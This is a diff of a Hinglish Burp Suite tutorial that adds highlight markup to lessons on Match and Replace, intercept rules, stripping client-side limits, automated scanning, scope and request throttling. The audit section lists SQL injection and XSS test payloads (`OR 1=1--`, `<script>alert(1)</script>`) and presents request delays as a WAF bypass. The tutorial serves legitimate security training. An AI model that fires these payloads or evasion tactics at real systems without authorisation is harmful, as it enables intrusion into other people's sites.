+    [[HL::Chalo ye try karte hain.::HL]]
+- [[HL::**Regex:** Is checkbox ko tick kar do kyunki `$^` ek regex pattern hai.::HL]]
+- [[HL::**Enabled:** Checkbox tick rahne do::HL]].
 
-Ab fields aise bhare honge:
+[[HL::Ab fields aise bhare honge:::HL]]
 ```text
-Type: Request header
-Match: $^
-Replace: X-My-Custom-Header: HelloWorld\n
-Regex: [x]
-Enabled: [x]
+[[HL::Type: Request header::HL]]
+[[HL::Match: $^::HL]]
+[[HL::Replace: X-My-Custom-Header: HelloWorld\n::HL]]
+[[HL::Regex: [x]::HL]]
+[[HL::Enabled: [x::HL]]]
 ```
-**Step 4: Rule save karo**
+[[HL::**Step 4: Rule save karo**::HL]]
 ```text
-"OK" button par CLICK karo.
+[[HL::"OK" button par CLICK karo.::HL]]
 ```
-**Expected Screen:** Tum wapas Options tab par aa jaoge. Table mein tumhara naya rule add ho chuka hoga.
+[[HL::**Expected Screen:** Tum wapas Options tab par aa jaoge. Table mein tumhara naya rule add ho chuka hoga.::HL]]
 
-**Step 5: Rule ko test karo**
+[[HL::**Step 5: Rule ko test karo**::HL]]
 ```text
-Firefox mein proxy on karo aur koi bhi website kholo (jaise example.com).
-Ab Proxy → HTTP History mein jao.
-Us request par click karo aur neeche "Request" tab mein dekho.
+[[HL::Firefox mein proxy on karo aur koi bhi website kholo (jaise example.com).::HL]]
+[[HL::Ab Proxy → HTTP History mein jao.::HL]]
+[[HL::Us request par click karo aur neeche "Request" tab mein dekho.::HL]]
 ```
-**Expected Screen:** Request headers ke beech mein tumhe ek nayi line dikhegi: `X-My-Custom-Header: HelloWorld`. Ye Burp ne automatically add kar di.
+[[HL::**Expected Screen:** Request headers ke beech mein tumhe ek nayi line dikhegi: `X-My-Custom-Header: HelloWorld`. Ye Burp ne automatically add kar di::HL]].
 
 ## ⚖️ 8. Comparison (Ye vs Woh):
 | Feature | Intercept (Manual) | Match and Replace (Automatic) |
@@ -1907,15 +1907,15 @@ Us request par click karo aur neeche "Request" tab mein dekho.
 | **Best For** | Ek baar ke specific modification (jaise CSRF token change). | Repetitive modifications (jaise har request mein header add karna). |
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
-- **Mistake 1: Regex bhool jana.**
-    - **Scenario:** Tumne `$^` match kiya but Regex checkbox tick nahi kiya. Rule kaam nahi karega.
-    - **Fix:** Jab bhi special characters (`$`, `^`, `*`, `.`) use karo to Regex checkbox tick karna mat bhoolna.
-- **Mistake 2: Replacement mein newline (`\n`) bhool jana.**
-    - **Scenario:** Tumne Replace mein `X-Header: Test` daala. Ye naya header add to ho jayega, lekin ye previous header ke saath ek line mein chipak sakta hai, jisse request corrupt ho sakti hai.
-    - **Fix:** Headers alag-alag lines mein hone chahiye. Isliye replacement ke end mein hamesha `\n` (newline) add karo, khas kar jab `$^` pattern use kar rahe ho.
-- **Mistake 3: Rule enable karna bhoolna.**
-    - **Scenario:** Rule bana liya, but checkbox tick nahi kiya. Traffic modify nahi hoga.
-    - **Fix:** Rule banane ke baat turant check karo ki uske aage ka checkbox tick hai ya nahi.
+- [[HL::**Mistake 1: Regex bhool jana.**::HL]]
+    - [[HL::**Scenario:** Tumne `$^` match kiya but Regex checkbox tick nahi kiya. Rule kaam nahi karega.::HL]]
+    - [[HL::**Fix:** Jab bhi special characters (`$`, `^`, `*`, `.`) use karo to Regex checkbox tick karna mat bhoolna::HL]].
+- [[HL::**Mistake 2: Replacement mein newline (`\n`) bhool jana.**::HL]]
+    - [[HL::**Scenario:** Tumne Replace mein `X-Header: Test` daala. Ye naya header add to ho jayega, lekin ye previous header ke saath ek line mein chipak sakta hai, jisse request corrupt ho sakti hai.::HL]]
+    - [[HL::**Fix:** Headers alag-alag lines mein hone chahiye. Isliye replacement ke end mein hamesha `\n` (newline) add karo, khas kar jab `$^` pattern use kar rahe ho.::HL]]
+- [[HL::**Mistake 3: Rule enable karna bhoolna.**::HL]]
+    - [[HL::**Scenario:** Rule bana liya, but checkbox tick nahi kiya. Traffic modify nahi hoga.::HL]]
+    - [[HL::**Fix:** Rule banane ke baat turant check karo ki uske aage ka checkbox tick hai ya::HL]] nahi.
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
 - **"Log sochte hain ki... Match and Replace sirf request headers ke saath kaam karta hai."**
@@ -1978,14 +1978,14 @@ Tumhara ghar hai jiska ek main gate (Proxy) hai. Tum gate par kuch advanced rule
 
 ## 📖 3. Technical Definition (Interview Answer):
 Advanced Proxy Settings, Burp Proxy ke **Options** tab mein chhupi hui settings ka ek set hai jo tumhe granular control deti hai ki Proxy kaise kaam karega. Do main advanced features hain:
-1.  **Intercept Rules:** Yahan tum rules bana sakte ho ki **kis type ki request/response ko intercept karna hai** aur kis type ko bypass karna hai. Jaise "sirf POST requests roko", "sirf wo requests roko jinka URL mein 'admin' ho", ya "CSS files ko intercept mat karo". Isse tum unwanted traffic ko filter kar sakte ho.
-2.  **Response Modification:** Yahan tum kuch predefined checks enable kar sakte ho jo automatically responses ko modify kar dete hain. Jaise "Unhide hidden form fields" (webpage mein jo `input type="hidden"` hote hain, unhe visible kar do) ya "Remove input length limits" (form fields ki `maxlength` property hata do). Ye client-side restrictions bypass karne mein madad karte hain.
+1.  [[HL::**Intercept Rules:** Yahan tum rules bana sakte ho ki **kis type ki request/response ko intercept karna hai** aur kis type ko bypass karna hai. Jaise "sirf POST requests roko", "sirf wo requests roko jinka URL mein 'admin' ho", ya "CSS files ko intercept mat karo". Isse tum unwanted traffic ko filter kar sakte ho::HL]].
+2.  [[HL::**Response Modification:** Yahan tum kuch predefined checks enable kar sakte ho jo automatically responses ko modify kar dete hain. Jaise "Unhide hidden form fields" (webpage mein jo `input type="hidden"` hote hain, unhe visible kar do) ya "Remove input length limits" (form fields ki `maxlength` property hata do). Ye client-side restrictions bypass karne mein madad karte hain::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem (Intercept Rules):** Jab tum kisi site ko test karte ho, to har chhoti request (jaise CSS files, images) bhi intercept hoti hain. Inhe baar-baar forward karna bore ho jata hai. Tum sirf important requests (jaise login form submit) par focus karna chahte ho.
-- **Solution (Intercept Rules):** Intercept Rules se tum Proxy ko bata sakte ho ki "CSS, JS, images ko kabhi mat roko, sirf POST requests roko" aur baki traffic ko bina intercept kiye jaane do. Isse tumhara kaam efficient ho jata hai.
-- **Problem (Response Modification):** Client-side (browser mein) kuch restrictions hoti hain, jaise form field ki maxlength 10 characters hai. Tum server par 100 characters bhej kar dekhna chahte ho ki woh handle kar pata hai ya nahi. Lekin browser tumhe 10 se zyada type karne hi nahi dega.
-- **Solution (Response Modification):** Response modification features (jaise "Remove input length limits") server se aaye hue HTML response ko modify kar denge. Jab browser ye modified HTML receive karega, to usme maxlength property nahi hogi, aur tum 100 characters type kar ke bhej sakte ho.
+- [[HL::**Problem (Intercept Rules):** Jab tum kisi site ko test karte ho, to har chhoti request (jaise CSS files, images) bhi intercept hoti hain. Inhe baar-baar forward karna bore ho jata hai. Tum sirf important requests (jaise login form submit) par focus karna chahte ho.::HL]]
+- [[HL::**Solution (Intercept Rules):** Intercept Rules se tum Proxy ko bata sakte ho ki "CSS, JS, images ko kabhi mat roko, sirf POST requests roko" aur baki traffic ko bina intercept kiye jaane do. Isse tumhara kaam efficient ho jata hai::HL]].
+- [[HL::**Problem (Response Modification):** Client-side (browser mein) kuch restrictions hoti hain, jaise form field ki maxlength 10 characters hai. Tum server par 100 characters bhej kar dekhna chahte ho ki woh handle kar pata hai ya nahi. Lekin browser tumhe 10 se zyada type karne hi nahi dega.::HL]]
+- [[HL::**Solution (Response Modification):** Response modification features (jaise "Remove input length limits") server se aaye hue HTML response ko modify kar denge. Jab browser ye modified HTML receive karega, to usme maxlength property nahi hogi, aur tum 100 characters type kar ke bhej sakte ho::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 - **Location:** Burp Suite mein **Proxy** tab ke andar **Options** sub-tab par jao. Do section honge:
@@ -1998,17 +1998,17 @@ Advanced Proxy Settings, Burp Proxy ke **Options** tab mein chhupi hui settings 
         - [ ] Remove JavaScript form validation
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1.  **Intercept Rules:**
-    - Step 1: Tum Proxy → Options → Intercept Client Requests mein jaakar rules add/edit karte ho.
-    - Step 2: Har rule mein tum kuch conditions define karte ho (e.g., "URL", "Method", "Parameter") aur ek operator (e.g., "matches", "contains") aur ek value (e.g., "POST").
-    - Step 3: Tum ek "Or" ya "And" operator se multiple rules ko jod sakte ho.
-    - Step 4: Sabse important rule hai "Drop unchecked items" jo sabse upar rehta hai. Agar koi request in rules se match karti hai, to woh intercept hogi. Agar nahi karti, to woh auto-forward ho jayegi.
+1.  **[[HL::Intercept Rules::HL]]:**
+    - [[HL::Step 1: Tum Proxy → Options → Intercept Client Requests mein jaakar rules add/edit karte ho.::HL]]
+    - [[HL::Step 2: Har rule mein tum kuch conditions define karte ho (e.g., "URL", "Method", "Parameter") aur ek operator (e.g., "matches", "contains") aur ek value (e.g., "POST").::HL]]
+    - [[HL::Step 3: Tum ek "Or" ya "And" operator se multiple rules ko jod sakte ho.::HL]]
+    - [[HL::Step 4: Sabse important rule hai "Drop unchecked items" jo sabse upar rehta hai. Agar koi request in rules se match karti hai, to woh intercept hogi. Agar nahi karti, to woh auto-forward ho jayegi::HL]].
 
-2.  **Response Modification:**
-    - Step 1: Tum Proxy → Options → Response Modification mein koi checkbox enable karte ho, jaise "Remove input length limits".
-    - Step 2: Jab bhi koi response Proxy se guzrega (server se browser ki taraf), Burp uske HTML content ko parse karega.
-    - Step 3: Agar enable feature relevant ho (jaise HTML mein koi `<input maxlength="10">` mila), to Burp automatically us property ko hata dega.
-    - Step 4: Modified response browser ko bhej diya jayega.
+2.  **[[HL::Response Modification::HL]]:**
+    - [[HL::Step 1: Tum Proxy → Options → Response Modification mein koi checkbox enable karte ho, jaise "Remove input length limits::HL]]".
+    - [[HL::Step 2: Jab bhi koi response Proxy se guzrega (server se browser ki taraf), Burp uske HTML content ko parse karega.::HL]]
+    - [[HL::Step 3: Agar enable feature relevant ho (jaise HTML mein koi `<input maxlength="10">` mila), to Burp automatically us property ko hata dega.::HL]]
+    - [[HL::Step 4: Modified response browser ko bhej diya jayega::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 
@@ -2170,67 +2170,67 @@ Socho tumhe ek **bade school building** ki security check karni hai.
 
 ## 📖 3. Technical Definition (Interview Answer):
 **New Scan** Burp Suite Professional ka feature hai jo **automated web vulnerability scanning** provide karta hai. Jab tum "New Scan" click karte ho, to tum do cheezein schedule kar sakte ho:
-1.  **Crawl (Spidering):** Burp target website ke root URL se shuru hota hai, saare links follow karta hai, forms submit karta hai, aur application ka ek complete **map** (site tree) banata hai. Isme wo saare pages, directories, parameters, aur endpoints dhundhta hai jo publicly accessible hain.
-2.  **Audit (Vulnerability Scanning):** Crawl ke dauran ya baad mein, Burp dhundhe gaye har endpoint par **hundreds of pre-defined vulnerability checks** chalaata hai. Ye checks SQL Injection, Cross-Site Scripting (XSS), Command Injection, insecure configurations jaise vulnerabilities ko dhundhte hain.
+1.  [[HL::**Crawl (Spidering):** Burp target website ke root URL se shuru hota hai, saare links follow karta hai, forms submit karta hai, aur application ka ek complete **map** (site tree) banata hai. Isme wo saare pages, directories, parameters, aur endpoints dhundhta hai jo publicly accessible hain.::HL]]
+2.  [[HL::**Audit (Vulnerability Scanning):** Crawl ke dauran ya baad mein, Burp dhundhe gaye har endpoint par **hundreds of pre-defined vulnerability checks** chalaata hai. Ye checks SQL Injection, Cross-Site Scripting (XSS), Command Injection, insecure configurations jaise vulnerabilities ko dhundhte hain::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem:** Manual testing mein, ek website ke saare pages tak pahunchna aur har page par har type ki vulnerability check karna **ghanton ya dinon ka kaam** ho sakta hai. Koi page chhoot bhi sakta hai. Ek vulnerability miss hone ka matlab hai ki hack ho sakte ho.
-- **Solution:** New Scan **automates** is dono process ko. Ye **fast, comprehensive, aur consistent** hai. Burp machine hai, thakta nahi, har possible path par jaata hai aur har known attack try karta hai. Tum ise raat ko chala do aur subah tak report ready.
+- [[HL::**Problem:** Manual testing mein, ek website ke saare pages tak pahunchna aur har page par har type ki vulnerability check karna **ghanton ya dinon ka kaam** ho sakta hai. Koi page chhoot bhi sakta hai. Ek vulnerability miss hone ka matlab hai ki hack ho sakte ho.::HL]]
+- [[HL::**Solution:** New Scan **automates** is dono process ko. Ye **fast, comprehensive, aur consistent** hai. Burp machine hai, thakta nahi, har possible path par jaata hai aur har known attack try karta hai. Tum ise raat ko chala do aur subah tak report ready::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Burp Suite Professional ke top menu mein **"Dashboard"** tab hota hai. Wahan jaao. Ya phir **Target** tab mein kisi bhi URL par right-click karo → **"Scan"** → **"New Scan..."** .
-- **Appearance:**
-    1.  Pehle ek **"New Scan" wizard** khulega. Iska apna ek window hoga.
-    2.  Pehle screen par ek field hogi **"URLs to scan"** . Yahan target URL dalna hota hai.
-    3.  Neeche do checkbox honge:
-        - [x] **Crawl** (usually by default ticked)
-        - [x] **Audit** (usually by default ticked)
-    4.  "Next" button hoga aage badhne ke liye.
+- [[HL::**Location:** Burp Suite Professional ke top menu mein **"Dashboard"** tab hota hai. Wahan jaao. Ya phir **Target** tab mein kisi bhi URL par right-click karo → **"Scan"** → **"New Scan..."** .::HL]]
+- [[HL::**Appearance:**::HL]]
+    1.  [[HL::Pehle ek **"New Scan" wizard** khulega. Iska apna ek window hoga.::HL]]
+    2.  [[HL::Pehle screen par ek field hogi **"URLs to scan"** . Yahan target URL dalna hota hai.::HL]]
+    3.  [[HL::Neeche do checkbox honge:::HL]]
+        - [[HL::[x] **Crawl** (usually by default ticked)::HL]]
+        - [[HL::[x] **Audit** (usually by default ticked)::HL]]
+    4.  [[HL::"Next" button hoga aage badhne ke liye::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1.  **Crawl ka kaam:**
-    - Step 1: Burp diye gaye URL par request bhejta hai (`GET /`).
-    - Step 2: Response mein jo HTML aata hai, Burp usko parse karta hai. Saare `<a href="...">` tags (links) nikaal leta hai.
-    - Step 3: In naye links par bhi same process repeat karta hai (recursive).
-    - Step 4: Forms milti hain to unhe bhi default values bhar kar submit karta hai.
-    - Step 5: Robots.txt file check karta hai ki hidden directories hain kya.
-    - Step 6: JavaScript files ko parse karke unmein chhupe endpoints (jaise `/api/user/{id}`) dhundhta hai.
+1.  [[HL::**Crawl ka kaam:**::HL]]
+    - [[HL::Step 1: Burp diye gaye URL par request bhejta hai (`GET /`).::HL]]
+    - [[HL::Step 2: Response mein jo HTML aata hai, Burp usko parse karta hai. Saare `<a href="...">` tags (links) nikaal leta hai.::HL]]
+    - [[HL::Step 3: In naye links par bhi same process repeat karta hai (recursive).::HL]]
+    - [[HL::Step 4: Forms milti hain to unhe bhi default values bhar kar submit karta hai.::HL]]
+    - [[HL::Step 5: Robots.txt file check karta hai ki hidden directories hain kya.::HL]]
+    - [[HL::Step 6: JavaScript files ko parse karke unmein chhupe endpoints (jaise `/api/user/{id}`) dhundhta hai::HL]].
 
 2.  **Audit ka kaam:**
-    - Step 1: Crawl se mile har unique request ko le leta hai.
-    - Step 2: Har vulnerability check ke hisaab se original request mein **payloads insert** karta hai. SQL Injection ke liye `'` , `"` , `OR 1=1--` ; XSS ke liye `<script>alert(1)</script>` ; etc.
-    - Step 3: Server ke response ko analyze karta hai. Agar response mein SQL error aaya, to SQL injection vulnerable. Agar script wapas aayi aur execute hui, to XSS vulnerable.
-    - Step 4: Saare findings ko ek report mein compile karta hai.
+    - [[HL::Step 1: Crawl se mile har unique request ko le leta hai.::HL]]
+    - [[HL::Step 2: Har vulnerability check ke hisaab se original request mein **payloads insert** karta hai. SQL Injection ke liye `'` , `"` , `OR 1=1--` ; XSS ke liye `<script>alert(1)</script>` ; etc.::HL]]
+    - [[HL::Step 3: Server ke response ko analyze karta hai. Agar response mein SQL error aaya, to SQL injection vulnerable. Agar script wapas aayi aur execute hui, to XSS vulnerable.::HL]]
+    - [[HL::Step 4: Saare findings ko ek report mein compile karta hai::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
-**Note:** Ye steps Burp Suite Professional mein hain. Community Edition mein ye feature nahi hai, lekin concept samajh lo, interview kaam aayega.
+[[HL::**Note:** Ye steps Burp Suite Professional mein hain. Community Edition mein ye feature nahi hai, lekin concept samajh lo, interview kaam aayega.::HL]]
 
-**Step 1: Scan start karo**
+[[HL::**Step 1: Scan start karo**::HL]]
 ```text
-Burp Dashboard tab par jao.
-Left sidebar mein "Scans" ke neeche "+" (plus) button hoga, ya "New Scan" likha hoga.
-Use CLICK karo.
+[[HL::Burp Dashboard tab par jao.::HL]]
+[[HL::Left sidebar mein "Scans" ke neeche "+" (plus) button hoga, ya "New Scan" likha hoga.::HL]]
+[[HL::Use CLICK karo.::HL]]
 ```
-**Expected Screen:** Ek naya "New Scan" dialog box khulega.
+[[HL::**Expected Screen:** Ek naya "New Scan" dialog box khulega.::HL]]
 
-**Step 2: URL and scan type select karo**
+[[HL::**Step 2: URL and scan type select karo**::HL]]
 ```text
-"URLs to scan" field mein target ka URL likho, e.g., https://example.com
+[[HL::"URLs to scan" field mein target ka URL likho, e.g., https://example.com::HL]]
 
-Ensure karo ki neeche "Crawl" aur "Audit" dono checkboxes tick hain.
+[[HL::Ensure karo ki neeche "Crawl" aur "Audit" dono checkboxes tick hain::HL]].
 ```
 **Step 3: Next par click karo**
 ```text
 "Next" button dabao.
 ```
-**Expected Screen:** Ab "Scan Details" screen khulegi. Yahan tumhe **Scope** aur **Settings** dikhenge. Isse hum agle topic mein detail mein dekhenge. Filhal "Next" dabate jao.
+[[HL::**Expected Screen:** Ab "Scan Details" screen khulegi. Yahan tumhe **Scope** aur **Settings** dikhenge. Isse hum agle topic mein detail mein dekhenge. Filhal "Next" dabate jao.::HL]]
 
-**Step 4: Review aur Launch**
+[[HL::**Step 4: Review aur Launch**::HL]]
 ```text
-Aakhri screen par tum apni settings ka summary dekh sakte ho.
-"Run scan" button par CLICK karo.
+[[HL::Aakhri screen par tum apni settings ka summary dekh sakte ho.::HL]]
+[[HL::"Run scan" button par CLICK karo.::HL]]
 ```
-**Expected Screen:** Tum wapas Dashboard par aa jaoge. Scans list mein ek naya scan entry dikhega jiska status "Pending" ya "Running" hoga. Tum us par click karke real-time progress dekh sakte ho, kaun se requests bhej raha hai, kaun si vulnerabilities mil rahi hain.
+[[HL::**Expected Screen:** Tum wapas Dashboard par aa jaoge. Scans list mein ek naya scan entry dikhega jiska status "Pending" ya "Running" hoga. Tum us par click karke real-time progress dekh sakte ho, kaun se requests bhej raha hai, kaun si vulnerabilities mil rahi hain::HL]].
 
 ## ⚖️ 8. Comparison (Ye vs Woh):
 | Feature | **Crawl** | **Audit** |
@@ -2241,9 +2241,9 @@ Aakhri screen par tum apni settings ka summary dekh sakte ho.
 | **Analogy** | School mein ghoom kar map banana. | Har darwaze ki taali check karna. |
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
-- **Mistake 1: Sirf crawl kiya, audit nahi.**
-    - **Scenario:** Tumne "Crawl only" select kiya. Burp ne poora map to bana diya, lekin vulnerabilities check nahi ki. Tum sochoge ki scan complete ho gaya, lekin tumhe koi vulnerability nahi mili.
-    - **Fix:** Ensure karo ki dono "Crawl" aur "Audit" ticked hain jab tak ki tumhe sirf mapping ki zaroorat na ho.
+- [[HL::**Mistake 1: Sirf crawl kiya, audit nahi.**::HL]]
+    - [[HL::**Scenario:** Tumne "Crawl only" select kiya. Burp ne poora map to bana diya, lekin vulnerabilities check nahi ki. Tum sochoge ki scan complete ho gaya, lekin tumhe koi vulnerability nahi mili.::HL]]
+    - [[HL::**Fix:** Ensure karo ki dono "Crawl" aur "Audit" ticked hain jab tak ki tumhe sirf mapping ki zaroorat na ho::HL]].
 - **Mistake 2: Bina login ke scan.**
     - **Scenario:** Tumne ek site scan ki jisme user login karna padta hai. Burp sirf public pages (login page, about us) tak ghooma, andar ke protected pages (dashboard, profile) nahi. Vulnerabilities miss ho gayi.
     - **Fix:** Scan settings mein application login details do (Topic 5.3 mein dekhenge).
@@ -2258,9 +2258,9 @@ Aakhri screen par tum apni settings ka summary dekh sakte ho.
     - **Actually, aisa ho sakta hai...** Agar site unstable hai ya kuch payloads server ko overload kar den, to site crash ya slow ho sakti hai. Isliye production environment mein scan karne se pehle permission lena aur **Resource Pool** mein delay set karna zaroori hai (Topic 5.3).
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
-- **Scenario:** Ek pentester ko ek large e-commerce site test karni thi jisme hundreds of products aur categories the.
-- **How they used it:** Usne Burp Pro mein ek "New Scan" start kiya. Pehle Crawl ne site ka full map bana liya, saari categories, products, search functionality, aur user profile pages discover kar liye. Phir Audit ne har page par SQL injection aur XSS ke payloads try kiye.
-- **Result:** Audit ne ek product page par **blind SQL injection** discover kiya jo manual testing mein bahut mushkil se milta. Pentester ne is vulnerability ko report kiya aur client ne turant fix kiya. Burp ki automation se time bacha aur koi page miss nahi hua.
+- [[HL::**Scenario:** Ek pentester ko ek large e-commerce site test karni thi jisme hundreds of products aur categories the.::HL]]
+- [[HL::**How they used it:** Usne Burp Pro mein ek "New Scan" start kiya. Pehle Crawl ne site ka full map bana liya, saari categories, products, search functionality, aur user profile pages discover kar liye. Phir Audit ne har page par SQL injection aur XSS ke payloads try kiye.::HL]]
+- [[HL::**Result:** Audit ne ek product page par **blind SQL injection** discover kiya jo manual testing mein bahut mushkil se milta. Pentester ne is vulnerability ko report kiya aur client ne turant fix kiya. Burp ki automation se time bacha aur koi page miss nahi hua::HL]].
 
 ## 🎨 12. Visual Diagram (ASCII Art):
 ````
@@ -2327,36 +2327,36 @@ Socho tumhe ek **big hospital** ki security check karni hai. Hospital ke andar b
 - **Scan Configuration:** Tum ek plan banate ho. "Kaise check karna hai?" Tum kehte ho, "Pehle bahut tezi se poora ghoom lo (fast crawl), phir sirf high-risk cheezein check karo (audit critical only)". Ye configuration hai.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**Detailed Scope** aur **Scan Configuration** scan ko control karne ke advanced settings hain.
-- **Include URL Prefixes:** Tum specific URLs ya directories define karte ho jinhe scan mein **shamil karna hai**. Burp sirf inhi prefixes ke andar ghoomega aur audit karega.
-- **Exclude URL Prefixes:** Tum wo URLs define karte ho jinhe scan se **bahar rakhna hai**, chahe woh include scope mein kyun na aate hon.
+[[HL::**Detailed Scope** aur **Scan Configuration** scan ko control karne ke advanced settings hain.::HL]]
+- [[HL::**Include URL Prefixes:** Tum specific URLs ya directories define karte ho jinhe scan mein **shamil karna hai**. Burp sirf inhi prefixes ke andar ghoomega aur audit karega.::HL]]
+- [[HL::**Exclude URL Prefixes:** Tum wo URLs define karte ho jinhe scan se **bahar rakhna hai**, chahe woh include scope mein kyun na aate hon::HL]].
 - **Scan Configuration:** Tum Burp ki scan library mein se ek configuration select kar sakte ho ya apni custom bana sakte ho. Jaise "Audit checks - all except JavaScript analysis" ka matlab hai ki JavaScript file analysis ke alawa saari checks chalao.
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem:** Agar tumne sirf `https://example.com` diya, to Burp us site ke andar har cheez par jaayega, chahe woh tumhara target ho ya na ho (e.g., logout links, third-party trackers). Isse time waste hota hai, aur tum unintentionally kisi aur ki site scan kar sakte ho.
-- **Solution (Scope):** Include/Exclude rules use karke tum **pinpoint accuracy** se sirf relevant areas ko scan kar sakte ho. Isse scan fast hota hai, aur legal boundaries safe rehti hain.
+- [[HL::**Problem:** Agar tumne sirf `https://example.com` diya, to Burp us site ke andar har cheez par jaayega, chahe woh tumhara target ho ya na ho (e.g., logout links, third-party trackers). Isse time waste hota hai, aur tum unintentionally kisi aur ki site scan kar sakte ho.::HL]]
+- [[HL::**Solution (Scope):** Include/Exclude rules use karke tum **pinpoint accuracy** se sirf relevant areas ko scan kar sakte ho. Isse scan fast hota hai, aur legal boundaries safe rehti hain::HL]].
 - **Problem:** Sab vulnerabilities check karne mein time lagta hai. Kabhi tumhe sirf specific vulnerabilities (jaise SQL injection) check karni hoti hain. Kabhi tumhe fast scan chahiye.
 - **Solution (Scan Configuration):** Library se relevant configuration choose karo. Jaise "Crawl and Audit - Fast" for quick overview, "Audit - All checks" for deep analysis.
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** New Scan wizard mein "Scan Details" screen par.
-- **Appearance:**
-    - Left side mein ek section hoga **"Scope"** . Uske andar do fields:
-        - **Include in crawl/audit (URL prefixes)** : Ek box jisme URLs add kar sakte ho. Saath mein "Add" button.
-        - **Exclude from crawl/audit (URL prefixes)** : Ek aur box jisme excluded URLs add kar sakte ho.
-    - Right side mein **"Scan Configuration"** hoga. Ek dropdown hoga jisme se configuration select karna hai. Jaise:
-        - Crawl only
-        - Audit only
-        - Crawl and Audit - Fast
-        - Crawl and Audit - Thorough
-        - Audit - All checks
+- [[HL::**Location:** New Scan wizard mein "Scan Details" screen par.::HL]]
+- [[HL::**Appearance:**::HL]]
+    - [[HL::Left side mein ek section hoga **"Scope"** . Uske andar do fields:::HL]]
+        - [[HL::**Include in crawl/audit (URL prefixes)** : Ek box jisme URLs add kar sakte ho. Saath mein "Add" button.::HL]]
+        - [[HL::**Exclude from crawl/audit (URL prefixes)** : Ek aur box jisme excluded URLs add kar sakte ho.::HL]]
+    - [[HL::Right side mein **"Scan Configuration"** hoga. Ek dropdown hoga jisme se configuration select karna hai. Jaise:::HL]]
+        - [[HL::Crawl only::HL]]
+        - [[HL::Audit only::HL]]
+        - [[HL::Crawl and Audit - Fast::HL]]
+        - [[HL::Crawl and Audit - Thorough::HL]]
+        - [[HL::Audit - All checks::HL]]
         - ... etc.
 
 ## ⚙️ 6. Under the Hood (Technical Working):
 1.  **Scope Inclusion:**
-    - Jab Burp koi naya URL discover karta hai (`/products/123`), to wo pehle check karta hai ki ye URL kisi "Include" rule se match karta hai ya nahi.
-    - Agar match karta hai, to wo aage process hota hai (crawl/audit).
-    - Agar nahi karta, to wo URL turant discard kar diya jata hai.
+    - [[HL::Jab Burp koi naya URL discover karta hai (`/products/123`), to wo pehle check karta hai ki ye URL kisi "Include" rule se match karta hai ya nahi.::HL]]
+    - [[HL::Agar match karta hai, to wo aage process hota hai (crawl/audit).::HL]]
+    - [[HL::Agar nahi karta, to wo URL turant discard kar diya jata hai::HL]].
 
 2.  **Scope Exclusion:**
     - Agar URL pehle include ho chuka hai, to Burp ek second check karta hai ki ye kisi "Exclude" rule se match to nahi karta.
@@ -2453,12 +2453,12 @@ List mein se "Crawl and Audit - Thorough" select karo (for deep testing) ya "Cra
 ````
 
 ## 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1 (Granular Scope):** Include rules ko jitna specific kar sakte ho karo. Jaise `https://example.com/app/v2/` agar sirf v2 test karna hai to.
+- [[HL::**Tip 1 (Granular Scope):** Include rules ko jitna specific kar sakte ho karo. Jaise `https://example.com/app/v2/` agar sirf v2 test karna hai to::HL]].
 - **Tip 2 (Use Macros for Logout):** Agar logout ko exclude nahi kar sakte (kyunki wo har jagah link hai), to ek "macro" banao jo scan ke baad automatically re-login kar de. Ye advanced hai, but useful.
 - **Tip 3 (Custom Configurations):** Library mein apni khud ki configuration save kar sakte ho. Jaise "My Project - Deep Scan" jisme saare checks on ho aur crawl speed moderate ho.
 
 ## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
-- **Scenario 1 (Include bhoolna):** Tumne sirf root URL diya, lekin application ka important part `/api` par tha. Burp ne `/api` discover kiya lekin woh root prefix ke andar nahi aata tha? Depend karta hai. Agar relative link `/api` tha to aayega. Lekin agar absolute link `https://api.example.com` tha to nahi aayega. Scope define na karne se tum miss kar doge.
+- [[HL::**Scenario 1 (Include bhoolna):** Tumne sirf root URL diya, lekin application ka important part `/api` par tha. Burp ne `/api` discover kiya lekin woh root prefix ke andar nahi aata tha? Depend karta hai. Agar relative link `/api` tha to aayega. Lekin agar absolute link `https://api.example.com` tha to nahi aayega. Scope define na karne se tum miss kar doge::HL]].
 - **Scenario 2 (Exclude bhoolna):** Logout ya delete account wali request chali gayi. Scan beech mein fail ho gaya, time waste hua.
 
 ## ❓ 15. FAQ (Interview Questions):
@@ -2493,32 +2493,32 @@ Ye teen advanced settings hain jo scan ke behavior ko fine-tune karti hain.
 - **Auditing Settings:** Yahan tum **audit ki speed aur accuracy** ko control kar sakte ho.
     - **Audit Speed:** Fast, Normal, or Slow. Fast matlab jaldi jaldi requests bhejna, Slow matlab dheere dheere (WAF se bachne ke liye).
     - **Audit Accuracy:** Tum ye decide kar sakte ho ki Burp kitni thoroughness se checks karega. Zyada accuracy ka matlab zyada requests, zyada time.
-- **Application Login:** Agar tumhari target application mein authentication (login) hai, to tum Burp ko **credentials (username/password)** de sakte ho. Burp inka use karke automatically login karega aur authenticated pages ko bhi scan karega.
-- **Resource Pool:** Ye **system resources (CPU, network) ko manage** karne ka tareeka hai.
-    - **Max Concurrent Requests:** Ek time par kitni parallel requests bhejni hain. High number ka matlab fast scan, lekin server par load bhi zyada.
-    - **Delay between requests:** Do requests ke beech mein kitna time gap (milliseconds mein). Ye useful hai **WAF (Web Application Firewall) ko bypass** karne ke liye, jo ki tezi se aane wali requests ko block kar deta hai.
